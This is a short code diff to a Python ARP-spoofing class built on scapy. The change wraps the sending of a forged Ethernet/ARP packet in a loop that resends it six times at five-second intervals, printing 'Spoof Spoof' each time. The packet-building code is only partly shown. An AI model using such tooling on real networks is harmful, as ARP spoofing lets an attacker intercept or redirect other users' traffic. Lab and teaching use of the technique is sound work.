@@ -1,4 +1,5 @@
 import sys
+import time
 from scapy.all import *
 
 class ArpSpoofing():
@@ -31,8 +32,12 @@ class ArpSpoofing():
         packet = etherPart / arpPart
 
         #sends packet
-        sendp(packet, iface=self.interface, verbose=False)
-        print("Spoof Spoof")
+        counter = 5
+        while counter >= 0:
+            sendp(packet, iface=self.interface, verbose=False)
+            print("Spoof Spoof")
+            counter -= 1
+            time.sleep(5)
 
 
 
